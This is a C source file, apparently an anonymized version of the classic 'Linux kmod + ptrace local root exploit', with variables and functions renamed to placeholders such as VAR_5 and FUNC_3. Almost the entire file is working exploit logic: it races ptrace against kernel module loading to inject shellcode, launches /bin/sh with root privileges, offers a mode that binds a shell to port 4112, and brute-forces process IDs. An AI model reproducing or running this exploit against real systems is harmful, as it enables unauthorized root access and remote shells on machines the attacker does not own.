
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {int dummy; } ;


 char* VAR_0 ;
 char VAR_1 ;



 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (int ) ;
 char* VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int FUNC_1 (char*,char**,char**) ;
 int VAR_8 ;
 int FUNC_2 () ;
 int FUNC_3 (int ,char*,...) ;
 char FUNC_4 (int,char**,char*) ;
 int FUNC_5 () ;
 int FUNC_6 () ;
 int FUNC_7 (int) ;
 int VAR_9 ;
 int FUNC_8 (int,int) ;
 int VAR_10 ;
 struct stat VAR_11 ;
 int FUNC_9 (int) ;
 int VAR_12 ;
 char* VAR_13 ;
 int VAR_14 ;
 int FUNC_10 (char*) ;
 int VAR_15 ;
 scalar_t__ VAR_16 ;
 int VAR_17 ;
 int FUNC_11 (int,int ) ;
 int FUNC_12 (int,int ,int ) ;
 scalar_t__ FUNC_13 (char*,struct stat*) ;
 int VAR_18 ;
 int FUNC_14 (int ,char*) ;
 int FUNC_15 (int ,int ) ;
 int FUNC_16 (int ) ;
 int VAR_19 ;
 scalar_t__ VAR_20 ;
 int FUNC_17 (char*) ;
 int FUNC_18 (int) ;

int FUNC_19(int VAR_21, char ** VAR_22, char ** VAR_23)
{
int VAR_24=0;
char VAR_25;
int VAR_26=FUNC_5();
FUNC_3(VAR_18, "Linux kmod + ptrace local root exploit by <anszom@v-lo.krakow.pl>\n\n");
 if(FUNC_13("/proc/self/exe", &VAR_11) && FUNC_13(VAR_22[0], &VAR_11)){
 FUNC_10("stat(myself)");
 return 0;
 }

 while((VAR_25=FUNC_4(VAR_21, VAR_22, "sbdrc:"))!=VAR_1) switch(VAR_25) {
 case 'd': VAR_12=129; break;
 case 'b': VAR_12=130; break;
 case 'r': VAR_15=1; break;
 case 'c': VAR_5=VAR_13; break;
 case 's': VAR_24=1; break;
 default: FUNC_17(VAR_22[0]);
 }

 if(VAR_21!=VAR_14) FUNC_17(VAR_22[0]);

 if(!VAR_5){
  if(VAR_12!=128) VAR_5="/bin/sh";
  else{
  struct stat VAR_27;
   if(FUNC_13((VAR_5="/bin/id"), &VAR_27)) VAR_5="/usr/bin/id";
  }
 }

FUNC_11(VAR_3, VAR_19);

VAR_9=0;
 switch(VAR_12){
 case 128:
 FUNC_3(VAR_18, "=> Simple mode, executing %s > /dev/tty\n", VAR_5);
 FUNC_15(VAR_17, VAR_8);
 FUNC_14(VAR_17, VAR_5);
 break;

 case 129:
 FUNC_3(VAR_18, "=> Double-ptrace mode, executing %s, suid-helper %s\n",
   VAR_5, VAR_0);
  if((VAR_9=FUNC_2())==0){
  char *VAR_28[]={VAR_0, ((void*)0)};
  FUNC_3(VAR_18, "Starting suid program %s\n", VAR_0);
  FUNC_8(FUNC_6(), VAR_3);
  FUNC_1(VAR_28[0], VAR_28, VAR_23);
  FUNC_8(FUNC_6(), 9);
  FUNC_10("execve(SUID)");
  FUNC_0(0);
  }

  while(!VAR_16);

 FUNC_18(100000);
 FUNC_8(VAR_9, VAR_2);
 FUNC_9(VAR_9);
 break;

 case 130:
 FUNC_3(VAR_18, "=> portbind mode, executing %s on port 4112\n", VAR_5);

 FUNC_15(VAR_17, VAR_6);
 FUNC_14(VAR_17, VAR_5);
 break;
 }
FUNC_3(VAR_18, "sizeof(shellcode)=%d\n", FUNC_16(VAR_17));

FUNC_11(VAR_4, VAR_10);

 if(VAR_15){
 FUNC_3(VAR_18, "\033[1;31m"
"Randomized pids support enabled... be patient or load the system heavily,\n"
"this method does more brute-forcing\033[0m\n");
 }

again:
VAR_16=0;
 if((VAR_7=FUNC_2())==0){
 int VAR_29;
 FUNC_8(FUNC_6(), VAR_3);
  while(!VAR_16);

 FUNC_3(VAR_18, "=> Child process started");
  for(VAR_29=0;VAR_29<10;++VAR_29){
  FUNC_3(VAR_18, ".");
  FUNC_12(22,0,0);
  }
 FUNC_3(VAR_18, "\n");
 FUNC_8(FUNC_6(), VAR_4);
 FUNC_0(0);
 }

 while(!VAR_16);
FUNC_8(VAR_7, VAR_3);

 for(;;){
 int VAR_30;
  if(VAR_15){
   for(VAR_30=1;VAR_30<30000;++VAR_30)
   if(VAR_30!=VAR_7 && VAR_30!=VAR_26 && VAR_30!=VAR_9) FUNC_7(VAR_30);
  }else{
   for(VAR_30=VAR_7+1;VAR_30<VAR_7+10;VAR_30++) FUNC_7(VAR_30);
  }

  if(VAR_20){
  VAR_20=0;
   if(VAR_24) break;
  goto again;
  }
 }
FUNC_3(VAR_18, "Failed\n");
return 1;
}
